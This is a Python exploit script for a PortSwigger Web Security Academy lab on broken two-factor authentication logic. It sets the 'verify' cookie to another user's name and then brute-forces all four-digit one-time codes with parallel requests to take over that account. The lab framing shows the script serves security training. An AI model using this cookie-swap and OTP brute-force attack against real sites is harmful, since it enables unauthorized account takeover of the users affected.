"""
2FA Brute Force - Broken Logic
Target: PortSwigger 2FA Broken Logic Lab
Technique: Cookie swap + brute force OTP 0000-9999

Note: Written with AI assistance while learning.
      For educational purposes on legal platforms only.
"""

import requests
import concurrent.futures

url_login = "https://LAB-URL.web-security-academy.net/login"
url_2fa = "https://LAB-URL.web-security-academy.net/login2"

print("[*] Logging in as wiener...")
session = requests.Session()
session.post(url_login, data={
    "username": "wiener",
    "password": "peter"
})

print("[*] Triggering OTP for carlos...")
session.cookies.set("verify", "carlos")
session.get(url_2fa)

found = None

def try_otp(code):
    global found
    if found:
        return None

    otp = str(code).zfill(4)
    s = requests.Session()
    s.cookies.set("verify", "carlos")
    s.cookies.set("session", session.cookies.get("session"))

    r = s.post(url_2fa, data={"mfa-code": otp})
    print(f"Trying: {otp}", end="\r")

    if r.status_code == 302:
        found = otp
        print(f"\n[+] Valid OTP found: {otp}")
        return otp
    return None

print("[*] Brute forcing OTP...")
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    executor.map(try_otp, range(0, 10000))

if found:
    print(f"[+] OTP: {found}")
else:
    print("[-] Not found, restart lab!")

print("Done!")
